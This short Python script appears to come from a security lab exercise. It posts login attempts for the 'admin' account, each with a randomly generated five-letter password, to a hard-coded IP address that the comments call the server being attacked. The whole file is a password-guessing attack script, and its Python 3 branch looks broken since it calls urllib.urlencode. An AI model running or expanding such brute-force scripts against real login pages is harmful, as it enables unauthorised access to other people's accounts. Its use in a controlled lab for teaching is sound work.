import urllib
try:
    import urllib.request as urllib2
except:
    import urllib2

import random

# Change the IP address of the server you are attacking
# IP address of BRUCE in this case
url = 'http://128.237.164.200/login'
for i in range(1):
    str = ""
    c = ''
    for j in range(5):
        str = str+chr(random.randrange(26) + 97)
    #print(str)
    values = {'username' : 'admin',
          'pass' : str,
          'submit' : 'Login'}
    data = urllib.urlencode(values)
    binary_data = data.encode('ascii')
    req = urllib2.Request(url, binary_data)

    try:
        response = urllib2.urlopen(req)
        #print(response.read())
    except:
        print("404\n")
